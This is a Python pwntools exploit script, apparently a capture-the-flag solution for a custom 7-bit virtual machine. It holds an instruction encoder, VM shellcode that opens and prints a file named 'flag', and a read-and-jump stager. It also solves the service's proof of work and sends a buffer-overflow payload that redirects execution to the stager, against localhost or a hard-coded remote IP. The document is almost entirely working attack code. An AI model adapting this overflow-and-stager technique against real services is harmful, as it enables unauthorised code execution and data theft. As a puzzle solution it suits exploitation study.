#!/usr/bin/env python
from pwn import *
context.update(arch='amd64', os='linux')
p, u = pack, unpack

def pack_tri(v):
    lo = v & 0b1111111
    mid = (v >> 7) & 0b1111111
    hi = (v >> 14) & 0b1111111
    return chr(lo) + chr(hi) + chr(mid)

def unpack_tri(v):
    lo = ord(v[0])
    mid = ord(v[2])
    hi = ord(v[1])
    return lo | (mid << 7) | (hi << 14)

TYPE_R = 0
TYPE_I = 1

OP_LOAD_TRI = 0
OP_LOAD_BYTE = 1
OP_STORE_TRI = 2
OP_STORE_BYTE = 3
OP_MOV = 4
OP_SWAP = 5
OP_PUSH = 6
OP_POP = 7
OP_SYSCALL = 8
OP_ADD_TRI = 9
OP_ADD_BYTE = 10
OP_SUB_TRI = 11
OP_SUB_BYTE = 12
OP_SAR = 13
OP_SHL = 14
OP_MUL = 15
OP_DIV = 16
OP_INC = 17
OP_DEC = 18
OP_AND = 19
OP_OR = 20
OP_XOR = 21
OP_MOD = 22
OP_CMP_TRI = 23
OP_CMP_BYTE = 24
OP_JMP_GREATER = 25
OP_JMP_LESS = 26
OP_JMP_EQUAL = 27
OP_JMP_NOT_EQUAL = 28
OP_JMP = 29
OP_CALL = 30

REG_R0 = 0
REG_R1 = 1
REG_R2 = 2
REG_R3 = 3
REG_R4 = 4
REG_R5 = 5
REG_R6 = 6
REG_R7 = 7
REG_R8 = 8
REG_R9 = 9
REG_R10 = 10
REG_BP = 11
REG_SP = 12
REG_PC = 13
REG_EFLAGS = 14
REG_ZERO = 15

SYS_EXIT = 0
SYS_OPEN = 1
SYS_WRITE = 2
SYS_READ = 3
SYS_ALLOC = 4
SYS_RAND = 5

def encode_op(op, op_type=TYPE_I, r=0, r_i=0):
    opcode = (op << 9) | (op_type << 8)
    opcode |= r << 4
    extra = ''
    if op_type == TYPE_R:
        opcode |= r_i
    else:
        extra = pack_tri(r_i)
    out = ''
    out += chr(opcode >> 7)
    out += chr(opcode & 0b1111111)
    out += extra
    return out

STACK_DEFAULT_BASE  = 0xf4000

shellcode = ''

shellcode += encode_op(OP_MOV, TYPE_I, REG_R1, STACK_DEFAULT_BASE + 3)
shellcode += encode_op(OP_MOV, TYPE_I, REG_R0, unpack_tri('g\0\0'))
shellcode += encode_op(OP_STORE_TRI, TYPE_R, REG_R0, REG_R1)

shellcode += encode_op(OP_MOV, TYPE_I, REG_R1, STACK_DEFAULT_BASE)
shellcode += encode_op(OP_MOV, TYPE_I, REG_R0, unpack_tri('fla'))
shellcode += encode_op(OP_STORE_TRI, TYPE_R, REG_R0, REG_R1)

shellcode += encode_op(OP_MOV, TYPE_I, REG_R0, SYS_OPEN)
shellcode += encode_op(OP_SYSCALL)

# r2 = stack
shellcode += encode_op(OP_MOV, TYPE_R, REG_R2, REG_R1)
# r1 = fd
shellcode += encode_op(OP_MOV, TYPE_R, REG_R1, REG_R0)
# r3 = size
shellcode += encode_op(OP_MOV, TYPE_I, REG_R3, 64)

shellcode += encode_op(OP_MOV, TYPE_I, REG_R0, SYS_READ)
shellcode += encode_op(OP_SYSCALL)

shellcode += encode_op(OP_MOV, TYPE_I, REG_R1, 1)
shellcode += encode_op(OP_MOV, TYPE_I, REG_R0, SYS_WRITE)
shellcode += encode_op(OP_SYSCALL)

stager = ''
stager += encode_op(OP_MOV, TYPE_I, REG_R1, 0)
stager += encode_op(OP_MOV, TYPE_I, REG_R2, STACK_DEFAULT_BASE + 256)
stager += encode_op(OP_MOV, TYPE_I, REG_R3, 256)
stager += encode_op(OP_MOV, TYPE_I, REG_R0, SYS_READ)
stager += encode_op(OP_SYSCALL)
stager += encode_op(OP_JMP, TYPE_R, REG_R2, REG_ZERO)

local = True
if local:
    conn = remote('localhost', 1235)
else:
    conn = remote('13.124.182.123', 8888)

def solve_pow():
    conn.recvuntil('prefix : ')
    challenge = conn.recv(6)
    conn.recvuntil('answer : ')

    print 'got challenge:', challenge
    i = 0
    while True:
        attempt = challenge + str(i)
        if hashlib.sha1(attempt).hexdigest().endswith('000000'):
            break
        i += 1
        if i % 100000 == 0:
            print i
    conn.sendline(attempt)

if not local:
    solve_pow()

conn.recvuntil('name>')

buf_addr = 0xf5f9e
payload = ''
payload += stager.ljust(0x3c - 3, 'A')
payload += pack_tri(0x12345)
payload += pack_tri(0)
payload += pack_tri(buf_addr)
conn.write(payload)

conn.write(shellcode.ljust(256, 'A'))
conn.interactive(prompt='')
